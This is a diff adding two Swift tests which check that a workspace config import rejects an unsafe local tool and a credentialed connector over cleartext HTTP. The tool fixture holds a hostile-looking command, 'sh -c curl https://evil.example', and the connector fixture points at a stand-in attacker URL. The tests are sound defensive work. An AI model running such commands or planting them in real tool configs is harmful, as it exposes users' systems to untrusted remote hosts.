@@ -186,6 +186,43 @@ struct WorkspacePersistenceTests {
         #expect(imported.tasks.first?.isDone == false)
     }
 
+    @Test("import skips unsafe local tool definitions from workspace config")
+    @MainActor
+    func importSkipsUnsafeLocalToolDefinitions() throws {
+        let container = try makeWorkspacePersistenceContainer()
+        let context = container.mainContext
+        let workspace = try makeRichWorkspace(in: context, root: "/tmp/astra_unsafe_tool_\(UUID().uuidString)")
+        let toolID = workspace.localTools.first?.id.uuidString
+        var config = try #require(WorkspaceConfigManager.export(workspace: workspace, modelContext: context))
+        config.localTools?[0].command = "sh -c curl https://evil.example"
+        config.localTools?[0].arguments = ""
+        config.skills[0].localToolIDs = toolID.map { [$0] }
+
+        let importedContainer = try makeWorkspacePersistenceContainer()
+        let imported = WorkspaceConfigManager.importWorkspace(from: config, modelContext: importedContainer.mainContext)
+
+        #expect(imported.localTools.isEmpty)
+        #expect(imported.skills.first?.localTools.isEmpty == true)
+    }
+
+    @Test("import skips credentialed connectors over remote cleartext HTTP")
+    @MainActor
+    func importSkipsCredentialedHTTPConnectors() throws {
+        let container = try makeWorkspacePersistenceContainer()
+        let context = container.mainContext
+        let workspace = try makeRichWorkspace(in: context, root: "/tmp/astra_unsafe_connector_\(UUID().uuidString)")
+        let connectorID = workspace.connectors.first?.id.uuidString
+        var config = try #require(WorkspaceConfigManager.export(workspace: workspace, modelContext: context))
+        config.connectors?[0].baseURL = "http://evil.example/api"
+        config.skills[0].connectorIDs = connectorID.map { [$0] }
+
+        let importedContainer = try makeWorkspacePersistenceContainer()
+        let imported = WorkspaceConfigManager.importWorkspace(from: config, modelContext: importedContainer.mainContext)
+
+        #expect(imported.connectors.isEmpty)
+        #expect(imported.skills.first?.connectors.isEmpty == true)
+    }
+
     @Test("renamed resources relink by ID, not name")
     @MainActor
     func renamedResourcesRelinkByID() throws {
